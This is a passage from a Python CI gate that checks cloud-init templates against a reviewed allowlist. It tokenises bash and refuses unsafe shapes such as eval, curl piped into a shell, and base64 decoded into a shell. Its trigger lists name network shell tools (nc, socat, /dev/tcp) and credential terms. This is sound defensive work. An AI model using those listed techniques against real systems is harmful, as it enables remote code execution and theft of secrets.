#!/usr/bin/env python3
# Copyright 2026 AlphaOne LLC
# SPDX-License-Identifier: Apache-2.0
"""#4616/#4657 - cloud-init memory templates: a fail-closed token allowlist.

Two templates (``infra/do-hive/cloud-init-memory.yaml.tpl`` and
``infra/aws-gpu-burst/cloud-init-memory.yaml.tpl``) provision a node and start
``ai-memory serve``. Rounds 1 and 2 of PR #4655 showed that a denylist of
forbidden spellings always has one more spelling it does not know (git through
a variable, curl into tar, a pin read from the network, a drop-in written by
printf, a case-changed sslmode key). The decision on #4657 (5-agent vote
(4d3ea1c5), memory 19497ef6) replaces those pattern rules with an allowlist.

Threat model (what this gate claims, and what it does not):
  The gate stops HONEST DRIFT: an edit that adds or changes a line able to
  fetch, execute, install, change a permission, name a credential, or reach the
  daemon's configuration fails here until the exact line is added to the
  reviewed allowlist ``scripts/qc-allowlists/cloud-init-token-allow.txt``.
  It does NOT claim to stop an author who both hides a token (a spelling the
  trigger list does not know) and edits this gate or its allowlist: that author
  is covered by code review of the allowlist diff, which is small and
  line-for-line. It does not prove that an allowlisted line is safe; the
  companion rule and the validators below refuse the shapes known to be unsafe
  even when someone lists them.

What runs, in order, for every template matching ``infra/*/cloud-init-memory*.tpl``:
  * Line model (``parse_template``): the YAML structure is read line by line
    (top-level keys, write_files entries that each start with ``- path:``,
    literal ``content: |`` blocks only). A block is a script (``#!`` first
    line), a systemd unit, or data. Script lines are joined at a trailing
    backslash (trailing whitespace after it still joins: fail closed), quote
    state and heredocs are tracked with bash rules, and a full-line ``#``
    comment is exempt ONLY outside a quote, outside a heredoc body and not
    after a continuation (the self-test proves each case).
  * Trigger (``triggered``): a structural line, a unit line, a shebang, every
    script line and every heredoc line are always triggered; a data-block line
    is triggered when its text, lower-cased and percent-decoded, holds a
    trigger word, path or metacharacter (``TRIGGER_RE``). Every triggered line
    must match an entry ``<scope> | <context> | <whitespace-normalised line>``
    of the allowlist, where scope is the template directory or ``both``.
  * Order and count (``run_scan``): per scope and context the approved lines
    must be the allowlist entries in file order, each as many times as it is
    listed; a moved, repeated or reordered approved line is red.
  * Allowlist form (``load_entries``): a malformed, non-normalised or
    unknown-scope entry, or one listed in both files, is a FAULT; an entry that matches nothing is stale
    (a ``both`` entry must match in both templates); an empty allowlist, a
    template with zero triggered lines, or fewer than two templates is a FAULT.
    ``scripts/qc-allowlists/cloud-init-token-pending.txt`` holds lines that are
    known defects with a tracker (``<scope> #<issue> | ...``); they pass the
    allowlist but are never validated as approved, and they go stale too.
  * Companion rule (``companion_hits``), on script blocks, data blocks,
    heredoc bodies (quoted or not), unit ``Exec*=`` commands and bootcmd/runcmd
    items (YAML flow lists included): refuses ``eval``, a glob or a
    ``$``-expansion or command substitution in command position (also behind
    sudo/env/exec/runuser/su/nice/timeout/xargs/flock/systemd-run wrappers),
    ANSI-C or locale quoting, a shell or interpreter fed by a pipe, a
    here-string, a process substitution or a heredoc, an expanded ``-c``
    script, ``source`` of a substitution, a decoder (base64 -d, xxd -r,
    openssl -d) in a statement that runs a shell, and an unparsable statement
    that holds ``$`` or a backtick. A literal ``-c`` script is checked again.
  * Validators (``validate_line``), on every approved (non-pending) line: a
    postgres URL must end with the exact ``sslmode=verify-full`` both raw and
    as sqlx decodes the query (case-sensitive key, percent-decoded keys and
    values, last wins); no case-variant sslmode key, no ``password`` or
    ``passfile`` key, a userinfo password only in /etc/ai-memory/store-url;
    no ``--store-url`` in any quoting, no ``AI_MEMORY_STORE_URL=``, no
    ``PGPASSWORD``/``PGPASSFILE``, no ``password=``, no lax-permission
    opt-out; curl/wget never ``|| true`` or piped into a shell, tar or
    interpreter; tar -x never ``|| true``; no unit binary under the service
    user's home; no ``encoding:``/``!!binary``/``source:``/``uri:`` in
    write_files; the store-url file and any chmod of it stay 0600.
  * Rendered user-data size (``userdata_hits``): the rendered template (both
    branches of every ``%{ }`` directive kept, each ``${x}`` replaced by a long
    stand-in) must fit the provider limit (AWS 16384, DigitalOcean 65536), or
    the template's main.tf must pass it through ``base64gzip`` and the gzip
    must fit. A template with no known limit is a FAULT.
  * Rules kept from the previous gate: 1 no non-ASCII byte (#1880); 2 some
    ExecStart runs ``ai-memory serve`` (fail closed on a launcher that hides
    the argv); 3 every serve argument is a ServeArgs flag of
    src/daemon_runtime.rs or a whole ``${name}`` value; 4 ``--tls-cert`` and
    ``--tls-key`` are both present (template policy).

Usage (any other argument exits 2):
  scripts/check-cloud-init-serve-flags.py                 exit 0 clean, 1 on a
                                                          hit, 2 on a FAULT
  scripts/check-cloud-init-serve-flags.py --self-test     red and green probes
  scripts/check-cloud-init-serve-flags.py --list-triggers print every triggered
                                                          line as an entry
"""
from __future__ import annotations

import argparse
import contextlib
import gzip
import hashlib
import io
import json
import posixpath
import re
import shlex
import sys
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SERVE_SRC = ROOT / "src" / "daemon_runtime.rs"
TEMPLATE_GLOB = "infra/*/cloud-init-memory*.tpl"
ALLOW_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-allow.txt"
HBA_CAT = 'cat "$HBA"; } > "$HBA.new"'
HBA_ORDER = ['HBA="/etc/postgresql/18/main/pg_hba.conf"', 'if ! grep -q "^# ai-memory-tls (#4635)" "$HBA"; then', HBA_CAT,
             'chown --reference="$HBA" "$HBA.new"', 'chmod --reference="$HBA" "$HBA.new"', 'mv "$HBA.new" "$HBA"', "fi"]
HBA_SHAPE = set(HBA_ORDER[:-1])
HBA_PIN = "the pinned pg_hba write (HBA_ORDER in scripts/check-cloud-init-serve-flags.py)"
HBA_PRINTF_RE = re.compile(r"""^\{ printf (?:'%s\\n'|"%s\\n") """)
HBA_OPENER_RE = re.compile(r"(?:\bthen|\bdo|\belse|\bin|\{|\(|&&|\|\||\|)$")
PENDING_FILE = ROOT / "scripts" / "qc-allowlists" / "cloud-init-token-pending.txt"
AWS_TEMPLATE = "infra/aws-gpu-burst/cloud-init-memory.yaml.tpl"
DO_TEMPLATE = "infra/do-hive/cloud-init-memory.yaml.tpl"
REQUIRED_FLAGS = ("--tls-cert", "--tls-key")
SCOPES = ("aws-gpu-burst", "do-hive", "both")
STORE_URL_PATH = "/etc/ai-memory/store-url"
# Provider user-data limits in bytes: EC2 16 KB (raw or the decoded base64),
# DigitalOcean 64 KiB.
USER_DATA_LIMITS = {"aws-gpu-burst": 16384, "do-hive": 65536}

# ---------------------------------------------------------------- triggers
TRIGGER_WORDS = (
    "git curl wget fetch_pinned tar unzip rsync scp sftp ftp nc ncat socat pip pip3 npm npx docker podman snap "
    "apt apt-get apt-key dpkg perl ruby node alias eval exec source chmod chown chgrp umask install useradd "
    "usermod groupadd runuser sudo su ln mv cp rm mkdir setfacl findmnt swapon openssl sha256sum gpg trap "
    "systemctl systemd-run bash sh dash zsh ksh base64 xxd tee dd crontab psql pg_dump pg_isready createuser "
    "sed awk mount sysctl iptables ufw ssh visudo passwd chpasswd sslmode sslrootcert password dsn dbname "
    "conninfo serve export declare readonly local read printf mapfile function env set unset shopt ifs "
    "if then elif else fi while until do done case esac for select exit return break continue true false nft iptables-restore ip6tables "
    "pipx uv uvx"
).split()
TRIGGER_RE = re.compile(
    r"(?<![\w-])(?:" + "|".join(re.escape(w) for w in TRIGGER_WORDS) + r"|python[\d.]*)(?![\w-])"
    r"|(?:^|[;&|(]\s*)\.\s|[\w:.-]\s*\(\s*\)"
    r"|://|/dev/tcp|/dev/udp|_commit|exec|environment|\.service|\[unit\]|\[service\]|\[install\]"
    r"|ld_preload|store[-_ ]?url|postgres|ai_memory_|api[-_]?key|tls|ssl|hba|shared_preload|allow_lax"
    r"|ai-memory|aimemory|pgpass|secret|token|key"
    r"|\$\(|`|\$\{|%\{|\$|>|<"
    r"|(?:^|[\s=\"'(:>])/(?:etc|opt|usr|run|var|root|home|lib|lib64|bin|sbin|dev|proc|sys|tmp|srv|mnt|boot)\b"
)

# ---------------------------------------------------------------- rules 1-4
STRUCT_RE = re.compile(r"pub struct ServeArgs \{(.*?)\n\}", re.S)
FIELD_RE = re.compile(r"^\s{4}pub (\w+):", re.M)
ATTR_RE = re.compile(r"#\[arg\((.*?)\)\]", re.S)
LONG_NAMED_RE = re.compile(r'\blong\s*=\s*"([^"]+)"')
LONG_BARE_RE = re.compile(r"(?<![\w=])long\s*(?:,|$)")
SHORT_NAMED_RE = re.compile(r"\bshort\s*=\s*'(.)'")
SHORT_BARE_RE = re.compile(r"(?<![\w=])short\s*(?:,|$)")
ALIAS_RE = re.compile(r'\b(?:visible_)?alias(?:es)?\s*=\s*"([^"]+)"')
ENV_WRAPPER_ARG_RE = re.compile(r"^(?:-i|--ignore-environment|\w+=\S*)$")
INTERP_RE = re.compile(r"\$?\$\{[A-Za-z_]\w*\}")
EXEC_RE = re.compile(r"^[ \t]*ExecStart=(?P<cmd>.*)$", re.M)
CONT_RE = re.compile(r"\\[ \t]*\n[ \t]*")
COMMENT_LINE_RE = re.compile(r"^[ \t]*#.*$", re.M)
DIRECTIVE_LINE_RE = re.compile(r"^[ \t]*%\{[^}]*\}[ \t]*$", re.M)
YAML_BREAK_RE = re.compile("[\r\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029]")
TF_OPEN_RE = re.compile(r"^[ \t]*%\{~?[ \t]*(?:if|for)\b")
TF_CLOSE_RE = re.compile(r"^[ \t]*%\{~?[ \t]*end(?:if|for)\b")

# ---------------------------------------------------------------- validators
# A postgres URL anywhere, but not a regex that merely begins with the scheme
# (s#^postgres://...#): the scheme starts the text or follows whitespace,
# = " ' ( ` > , or {.
DSN_RE = re.compile(r"(?<![^\s=\"'(`>,{])postgres(?:ql)?://[^\s\"']+")
UNIT_SUFFIXES = (".service", ".socket", ".timer", ".mount", ".path", ".target", ".slice", ".scope")
HEREDOC_RE = re.compile(r"<<(-?)[ \t]*(?:(['\"])([A-Za-z_]\w*)\2|\\?([A-Za-z_]\w*))")


def serve_flags(source: str) -> set:
    """Flags clap derives for ServeArgs: ``--long`` (field name, or explicit
    long = name) and ``-s`` (explicit short = 's', or bare short = first letter)."""
    body = STRUCT_RE.search(source)
    if body is None:
        raise RuntimeError("pub struct ServeArgs not found in " + str(SERVE_SRC))
    text = body.group(1)
    fields = list(FIELD_RE.finditer(text))
    if not fields:
        raise RuntimeError("ServeArgs has no fields")
    flags = set()
    prev_end = 0
    for fm in fields:
        attrs = " ".join(ATTR_RE.findall(text[prev_end:fm.start()]))
        prev_end = fm.end()
        named = LONG_NAMED_RE.findall(attrs)
        if named:
            flags.update("--" + n for n in named)
        elif LONG_BARE_RE.search(attrs):
            flags.add("--" + fm.group(1).replace("_", "-"))
        flags.update("--" + n for n in ALIAS_RE.findall(attrs))
        flags.update("-" + c for c in SHORT_NAMED_RE.findall(attrs))
        if SHORT_BARE_RE.search(attrs):
            flags.add("-" + fm.group(1)[0])
    if not flags:
        raise RuntimeError("ServeArgs exposes no flags")
    return flags


def strip_terraform(text: str) -> str:
    """Drop terraform ``%{ if }`` / ``%{ endif }`` directives so their words are
    not read as flags. Interpolations stay: they are checked where they sit."""
    return re.sub(r"%\{[^}]*\}", " ", text)


def blank_comments(text: str) -> str:
    """Blank whole-line comments (keeping the newline)."""
    return COMMENT_LINE_RE.sub("", text)


def join_continuations(text: str):
    """Collapse backslash-newline continuations; return (joined, line_at)."""
    parts, cuts, last, out_len = [], [], 0, 0
    for m in CONT_RE.finditer(text):
        seg = text[last:m.start()]
        parts.append(seg)
        out_len += len(seg) + 1
        parts.append(" ")
        cuts.append(out_len)
        last = m.end()
    parts.append(text[last:])
    joined = "".join(parts)

    def line_at(off: int) -> int:
        return joined.count("\n", 0, off) + 1 + sum(1 for c in cuts if c <= off)

    return joined, line_at


def prefix_is_env_wrapper(pre: list) -> bool:
    """Tokens before the ai-memory binary may only be an ``env`` wrapper."""
    if not pre:
        return True
    if posixpath.basename(pre[0].lstrip("-@+!:")) != "env":
        return False
    return all(ENV_WRAPPER_ARG_RE.match(t) for t in pre[1:])


def serve_arg_hits(name: str, lineno: int, after: list, known: set) -> list:
    """Rule 3: every token after ``serve`` is a ServeArgs flag or its value."""
    hits = []
    expect_value = False
    for raw in after:
        tok = raw.strip("\"'")
        if "$" in INTERP_RE.sub("X", tok):
            hits.append("%s:%d: serve argument %r holds an expansion that cannot be checked (flags must be literal; only a whole ${name} may be a value)" % (name, lineno, tok))
        if tok.startswith("-") and tok != "-":
            long_form = tok.startswith("--")
            key = tok.split("=", 1)[0] if long_form else tok[:2]
            if key not in known:
                hits.append("%s:%d: serve flag %s is not a ServeArgs flag (unit would exit at start)" % (name, lineno, key))
            expect_value = "=" not in tok if long_form else True
        else:
            if not expect_value:
                hits.append("%s:%d: serve argument %r does not follow a flag (serve takes no positional arguments)" % (name, lineno, tok))
            expect_value = False
    return hits


def serve_invocations(text: str) -> list:
    """Rule 2: (line, tokens-after-serve, unparsed) for every ExecStart that runs serve."""
    joined, line_at = join_continuations(blank_comments(text))
    found = []
    for m in EXEC_RE.finditer(joined):
        tokens = strip_terraform(m.group("cmd")).split()
        if "serve" not in tokens:
            continue
        line = line_at(m.start())
        bin_idx = next((i for i, t in enumerate(tokens) if posixpath.basename(t.lstrip("-@+!:")) == "ai-memory"), None)
        if bin_idx is None or "serve" not in tokens[bin_idx + 1:] or not prefix_is_env_wrapper(tokens[:bin_idx]):
            found.append((line, [], True))
            continue
        verb = tokens.index("serve", bin_idx + 1)
        found.append((line, tokens[verb + 1:], False))
    return found


def rules_1_to_4(name: str, text: str, known: set) -> list:
    hits = []
    if not text.startswith("#cloud-config\n"):
        hits.append("%s:1: first line is not exactly #cloud-config (cloud-init picks the handler from it)" % name)
    for lineno, line in enumerate(text.split("\n"), 1):
        if YAML_BREAK_RE.search(line):
            hits.append("%s:%d: a line break other than LF (YAML splits the line the gate reads as one)" % (name, lineno))
    for lineno, line in enumerate(text.splitlines(), 1):
        if any(ord(ch) > 127 for ch in line):
            hits.append("%s:%d: non-ASCII byte (cloud-init discards the config, #1880)" % (name, lineno))
    invocations = serve_invocations(text)
    if not invocations:
        hits.append("%s: no ExecStart runs 'ai-memory serve' (nothing to check; a template that cannot start serve must not pass)" % name)
    for lineno, after, unparsed in invocations:
        if unparsed:
            hits.append("%s:%d: ExecStart names serve but is not 'ai-memory serve' or an env wrapper of it (a launcher hides the argv)" % (name, lineno))
            continue
        hits.extend(serve_arg_hits(name, lineno, after, known))
        flags = [t.strip("\"'").split("=", 1)[0] for t in after if t.strip("\"'").startswith("-")]
        for req in REQUIRED_FLAGS:
            if req not in flags:
                hits.append("%s:%d: serve has no %s (template policy: supply the listener certificate with the node IP SAN)" % (name, lineno, req))
    return hits


# ---------------------------------------------------------------- bash lexing
def norm(text: str) -> str:
    return " ".join(text.split())


def _walk(s: str, state):
    """Walk ``s`` with bash quoting rules starting in ``state`` (None or a
    tuple stack of "'", '"', "(" for $( ) and "`"). Yield (index, unquoted)
    for every character and return the end state through StopIteration."""
    stack = list(state or ())
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        top = stack[-1] if stack else None
        if top == "'":
            if c == "'":
                stack.pop()
            yield i, False
            i += 1
            continue
        if top in ('"', "`"):
            if c == "\\":
                yield i, False
                i += 2
                continue
            if c == top:
                stack.pop()
            elif top == '"' and c == "$" and s[i + 1:i + 2] == "(":
                stack.append("(")
                yield i, False
                i += 2
                continue
            elif top == '"' and c == "`":
                stack.append("`")
            yield i, False
            i += 1
            continue
        if c == "\\":
            yield i, False
            i += 2
            continue
        if c in "'\"`":
            stack.append(c)
            yield i, False
            i += 1
            continue
        if c == "$" and s[i + 1:i + 2] == "(":
            stack.append("(")
            yield i, False
            i += 2
            continue
        if c == "(" and top == "(":
            stack.append("(")
        elif c == ")" and top == "(":
            stack.pop()
            yield i, False
            i += 1
            continue
        if c == "#" and (i == 0 or s[i - 1] in " \t;&|()"):
            break
        yield i, top is None
        i += 1
    return tuple(stack) or None


def scan_quotes(s: str, state):
    """Bash quote state after ``s`` starting in ``state`` (None when every
    quote, backtick and $( ) is closed). An unquoted ``#`` at the start of a
    word ends the scan (a comment)."""
    w = _walk(s, state)
    try:
        while True:
            next(w)
    except StopIteration as stop:
        return stop.value


def unquoted_mask(s: str, state):
    """Return (mask, end_state): mask[i] is True where s[i] is top-level code."""
    mask = [False] * len(s)
    w = _walk(s, state)
    try:
        while True:
            i, unq = next(w)
            mask[i] = unq
    except StopIteration as stop:
        return mask, stop.value


def heredoc_starts(s: str, state) -> list:
    """Heredoc operators outside quotes: list of (delimiter, strip_tabs, quoted)
    or the string "bad" for an operator whose delimiter cannot be read."""
    mask, _ = unquoted_mask(s, state)
    out = []
    i = 0
    while i < len(s) - 1:
        if mask[i] and s[i] == "<" and s[i + 1] == "<" and (i == 0 or s[i - 1] != "<"):
            if s[i + 2:i + 3] == "<":
                i += 3
                continue
            m = HEREDOC_RE.match(s, i)
            if m is None:
                out.append("bad")
                i += 2
                continue
            delim = m.group(3) or m.group(4)
            quoted = bool(m.group(2)) or s[m.start():m.end()].find("\\") >= 0
            out.append((delim, m.group(1) == "-", quoted))
            i = m.end()
            continue
        i += 1
    return out


def bq_end(s: str, i: int) -> int:
    n = len(s)
    while i < n:
        if s[i] == "\\":
            i += 2
            continue
        if s[i] == "`":
            return i
        i += 1
    return -1


def dq_end(s: str, i: int) -> int:
    n = len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == '"':
            return i
        if c == "$" and s[i + 1:i + 2] == "(":
            j = find_close(s, i + 2)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        i += 1
    return -1


def find_close(s: str, i: int) -> int:
    """Index of the ``)`` closing a ``(`` whose content starts at ``i``."""
    depth, n = 1, len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == "'":
            j = s.find("'", i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == '"':
            j = dq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return -1
            i = j + 1
            continue
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def brace_end(s: str, i: int) -> int:
    depth, n = 1, len(s)
    while i < n:
        c = s[i]
        if c == "\\":
            i += 2
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def dq_subs(inner: str) -> list:
    """Command substitutions inside double-quoted (or unquoted-heredoc) text."""
    subs, i, n = [], 0, len(inner)
    while i < n:
        c = inner[i]
        if c == "\\":
            i += 2
            continue
        if c == "$" and inner[i + 1:i + 2] == "(":
            j = find_close(inner, i + 2)
            if j < 0:
                return subs + [None]
            body = inner[i + 2:j]
            if not (body.startswith("(") and body.endswith(")")):
                subs.append(body)
            i = j + 1
            continue
        if c == "`":
            j = bq_end(inner, i + 1)
            if j < 0:
                return subs + [None]
            subs.append(inner[i + 1:j])
            i = j + 1
            continue
        i += 1
    return subs


OPS2 = ("&&", "||", "|&", ";;", ";&")


def tokenize(s: str):
    """Split a bash statement into commands. Returns (commands, subs, ansi) or
    None when the text cannot be parsed. A command is (words, pipe_in, term)."""
    cmds, words, subs = [], [], []
    st = {"word": "", "inword": False, "pipe": False}
    ansi = False

    def flush():
        if st["inword"]:
            words.append(st["word"])
        st["word"], st["inword"] = "", False

    def end_cmd(op):
        flush()
        cmds.append((list(words), st["pipe"], op))
        del words[:]
        st["pipe"] = op in ("|", "|&")

    def add(txt):
        st["word"] += txt
        st["inword"] = True

    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c in " \t":
            flush()
            i += 1
            continue
        if c == "\n":
            end_cmd("\n")
            i += 1
            continue
        if c == "#" and not st["inword"]:
            j = s.find("\n", i)
            i = n if j < 0 else j
            continue
        if c == "\\":
            if s[i + 1:i + 2] == "\n":
                i += 2
                continue
            add(s[i:i + 2])
            i += 2
            continue
        if c == "'":
            j = s.find("'", i + 1)
            if j < 0:
                return None
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == '"':
            j = dq_end(s, i + 1)
            if j < 0:
                return None
            got = dq_subs(s[i + 1:j])
            if None in got:
                return None
            subs.extend(got)
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == "$":
            nx = s[i + 1:i + 2]
            if nx in ("'", '"'):
                ansi = True
                add("$")
                i += 1
                continue
            if nx == "(":
                j = find_close(s, i + 2)
                if j < 0:
                    return None
                body = s[i + 2:j]
                if not (body.startswith("(") and body.endswith(")")):
                    subs.append(body)
                add(s[i:j + 1])
                i = j + 1
                continue
            if nx == "{":
                j = brace_end(s, i + 2)
                if j < 0:
                    return None
                got = dq_subs(s[i + 2:j])
                if None in got:
                    return None
                subs.extend(got)
                add(s[i:j + 1])
                i = j + 1
                continue
            add("$")
            i += 1
            continue
        if c == "`":
            j = bq_end(s, i + 1)
            if j < 0:
                return None
            subs.append(s[i + 1:j])
            add(s[i:j + 1])
            i = j + 1
            continue
        if c in "<>" and s[i + 1:i + 2] == "(":
            j = find_close(s, i + 2)
            if j < 0:
                return None
            subs.append(s[i + 2:j])
            add(s[i:j + 1])
            i = j + 1
            continue
        if c == "&" and (s[i + 1:i + 2] == ">" or (st["inword"] and st["word"][-1:] in "<>")):
            add(c)
            i += 1
            continue
        if c == "|" and st["inword"] and st["word"][-1:] == ">":
            add(c)
            i += 1
            continue
        if c in ";&|()":
            op = s[i:i + 2] if s[i:i + 2] in OPS2 else c
            end_cmd(op)
            i += len(op)
            continue
        add(c)
        i += 1
    end_cmd("")
    return cmds, subs, ansi


def unquote(w: str):
    """Return (value, expanded) for one shell word."""
    out, exp, i, n = [], False, 0, len(w)
    while i < n:
        c = w[i]
        if c == "\\":
            out.append(w[i + 1:i + 2])
            i += 2
            continue
        if c == "'":
            j = w.find("'", i + 1)
            if j < 0:
                out.append(w[i + 1:])
                break
            out.append(w[i + 1:j])
            i = j + 1
            continue
        if c == '"':
            j = dq_end(w, i + 1)
            if j < 0:
                j = n
            inner = w[i + 1:j]
            if "$" in inner or "`" in inner:
                exp = True
            out.append(re.sub(r'\\([$`"\\])', r"\1", inner))
            i = j + 1
            continue
        if c in "$`":
            exp = True
        out.append(c)
        i += 1
    return "".join(out), exp


ASSIGN_RE = re.compile(r"^[A-Za-z_]\w*(?:\[[^]]*\])?\+?=")
REDIR_RE = re.compile(r"^(?:\d*|&)(?:<<<|<<-|<<|<>|>>|>\||>&|<&|&>>|&>|<|>)(.*)$", re.S)
KEYWORDS = {"if", "then", "do", "else", "elif", "while", "until", "!", "time", "{", "}", "fi", "done", "esac", "coproc"}
SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "mksh", "busybox"}
INTERP_BASE_RE = re.compile(r"^(?:python[\d.]*|perl|ruby|node|nodejs|php|lua|tclsh|awk|gawk|mawk)$")
INTERP_SCRIPT_OPT = {"perl": ("-e", "-E"), "ruby": ("-e",), "node": ("-e", "--eval", "-p", "--print"), "nodejs": ("-e", "--eval", "-p"), "php": ("-r",), "lua": ("-e",)}
# (options that take an argument, positionals before the command)
WRAPPERS = {
    "sudo": ({"-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T", "--user", "--group", "--chdir", "--host", "--prompt", "--role", "--type", "--other-user", "--close-from", "--command-timeout"}, 0),
    "env": ({"-u", "--unset", "-C", "--chdir"}, 0),
    "exec": ({"-a"}, 0),
    "command": (set(), 0),
    "builtin": (set(), 0),
    "nohup": (set(), 0),
    "setsid": (set(), 0),
    "stdbuf": ({"-i", "-o", "-e", "--input", "--output", "--error"}, 0),
    "nice": ({"-n", "--adjustment"}, 0),
    "ionice": ({"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"}, 0),
    "timeout": ({"-s", "-k", "--signal", "--kill-after"}, 1),
    "runuser": ({"-u", "-g", "-G", "-s", "-w", "--user", "--group", "--supp-group", "--shell", "--whitelist-environment"}, 0),
    "su": ({"-s", "-g", "-G", "-w", "--shell", "--group", "--supp-group", "--whitelist-environment"}, 0),
    "xargs": ({"-I", "-n", "-P", "-d", "-L", "-s", "-E", "-a", "--arg-file", "--delimiter", "--max-args", "--max-procs", "--max-lines", "--max-chars", "--eof"}, 0),
    "chroot": ({"--userspec", "--groups"}, 1),
    "flock": ({"-w", "-E", "--timeout", "--conflict-exit-code"}, 1),
    "systemd-run": ({"-u", "--unit", "-p", "--property", "--description", "--slice", "-E", "--setenv", "--uid", "--gid", "-M", "--machine", "-H", "--host", "--working-directory", "--on-active", "--on-boot", "--on-calendar", "--timer-property", "--path-property", "--socket-property", "--service-type", "--nice"}, 0),
}
SCRIPT_OPTS = {"su": ("-c", "--command"), "runuser": ("-c", "--command"), "flock": ("-c", "--command"), "env": ("-S", "--split-string")}


def skip_prefix(words: list, i: int) -> int:
    """Skip keywords, assignments and redirections before a command word."""
    while i < len(words):
        w = words[i]
        if w in KEYWORDS or ASSIGN_RE.match(w):
            i += 1
            continue
        rm = REDIR_RE.match(w)
        if rm is not None and not w.startswith("<(") and not w.startswith(">("):
            i += 1 if rm.group(1) else 2
            continue
        break
    return i


def resolve(words: list):
    """Return (index of the command word or None, [(script, expanded)]) after
    skipping wrappers; a -c string given to su/runuser/flock is the command."""
    scripts = []
    i = skip_prefix(words, 0)
    for _ in range(12):
        if i >= len(words):
            return None, scripts
        val, exp = unquote(words[i])
        base = posixpath.basename(val)
        if exp or base not in WRAPPERS:
            return i, scripts
        opts, npos = WRAPPERS[base]
        rest = words[i + 1:]
        if base in ("su", "runuser", "flock"):
            for k, w in enumerate(rest):
                key = w.split("=", 1)[0]
                if key in SCRIPT_OPTS[base]:
                    sv = w.split("=", 1)[1] if "=" in w else (rest[k + 1] if k + 1 < len(rest) else "")
                    scripts.append(unquote(sv))
                    return None, scripts
            if base in ("su", "runuser") and "--" not in rest:
                return None, scripts
        j = i + 1
        while j < len(words):
            w = words[j]
            if w == "--":
                j += 1
                break
            if w.startswith("-") and w != "-":
                key = w.split("=", 1)[0]
                if base in SCRIPT_OPTS and key in SCRIPT_OPTS[base]:
                    sv = w.split("=", 1)[1] if "=" in w else (words[j + 1] if j + 1 < len(words) else "")
                    scripts.append(unquote(sv))
                    return None, scripts
                if key in opts and "=" not in w:
                    j += 2
                else:
                    j += 1
                continue
            if base in ("env", "sudo") and ASSIGN_RE.match(w):
                j += 1
                continue
            break
        if base in ("su", "runuser"):
            j = i + 1 + rest.index("--") + 1
        else:
            j += npos
        i = skip_prefix(words, j)
    return None, scripts + [("", True)]


def shell_script_word(base: str, args: list):
    """For a shell or interpreter: (has_script_option, script word or None)."""
    if base in SHELLS:
        for k, a in enumerate(args):
            if a == "--" or not a.startswith("-") or a.startswith("--"):
                if a.startswith("--") and a != "--":
                    continue
                return False, None
            if "c" in a[1:]:
                for b in args[k + 1:]:
                    if not b.startswith("-") or b == "-":
                        return True, b
                return True, None
        return False, None
    if base.startswith("python"):
        opts = ("-c",)
    elif base in ("awk", "gawk", "mawk"):
        return True, next((a for a in args if not a.startswith("-")), None)
    else:
        opts = INTERP_SCRIPT_OPT.get(base, ("-e",))
    for k, a in enumerate(args):
        if a in opts:
            return True, args[k + 1] if k + 1 < len(args) else None
    return False, None


def companion_hits(stmt: str, st: dict, depth: int = 0) -> list:
    """Refusals for one bash statement (see the module docstring)."""
    if depth > 8:
        return ["nesting deeper than 8 levels"]
    t = tokenize(stmt)
    if t is None:
        if "$" in stmt or "`" in stmt:
            return ["unparsable statement holding $ or a backtick"]
        return []
    cmds, subs, ansi = t
    out = []
    if ansi:
        out.append("ANSI-C or locale quoting ($' or $\")")
    runs_shell = False
    decodes = False
    for words, pipe_in, term in cmds:
        if not words:
            if term in (";;", ";&") and st.get("case", 0) > 0:
                st["pattern"] = True
            continue
        if st.get("pattern"):
            if term == ")":
                st["pattern"] = False
            continue
        if words[0] == "esac":
            st["case"] = max(0, st.get("case", 0) - 1)
            st["pattern"] = False
            continue
        idx, scripts = resolve(words)
        for sv, sexp in scripts:
            if sexp:
                out.append("expanded or unresolvable script given to a wrapper (-c/-S)")
            else:
                out.extend(companion_hits(sv, {}, depth + 1))
        if idx is None:
            if term in (";;", ";&") and st.get("case", 0) > 0:
                st["pattern"] = True
            continue
        cw = words[idx]
        val, exp = unquote(cw)
        if exp or "$" in cw or "`" in cw:
            out.append("command word %r is an expansion or command substitution" % cw[:40])
            continue
        base = posixpath.basename(val)
        args = words[idx + 1:]
        if not st.get("data") and val not in ("[", "[[") and re.search(r"[*?\[]", val):
            out.append("command word %r is a glob (the command is chosen at run time)" % cw[:40])
            continue
        if base == "case":
            st["case"] = st.get("case", 0) + 1
            st["pattern"] = True
            continue
        if term in (";;", ";&") and st.get("case", 0) > 0:
            st["pattern"] = True
        if base == "eval":
            out.append("eval")
        if base == "ai-memory":
            # #4837 R6: the subcommand must be a literal word the serve rule can read.
            if any(posixpath.basename(unquote(w)[0]) == "xargs" for w in words[:idx]):
                out.append("ai-memory under xargs (its subcommand comes from stdin)")
            after_flag = False
            for w in args:
                wv, wexp = unquote(w)
                if wexp or "$" in w or "`" in w:
                    if not after_flag:
                        out.append("ai-memory subcommand position holds an expansion %r" % w[:40])
                        break
                    after_flag = False
                    continue
                if wv.startswith("-"):
                    after_flag = "=" not in wv
                    continue
                if after_flag:
                    after_flag = False
                    continue
                break
        if base in ("source", ".") and args and re.match(r"^[\"']?[<$]\(", args[0]):
            out.append("source of a substitution")
        is_shell = base in SHELLS
        if is_shell or INTERP_BASE_RE.match(base):
            if is_shell:
                runs_shell = True
            has_c, sw = shell_script_word(base, args)
            if has_c:
                if sw is None:
                    out.append("%s script option without a script" % base)
                else:
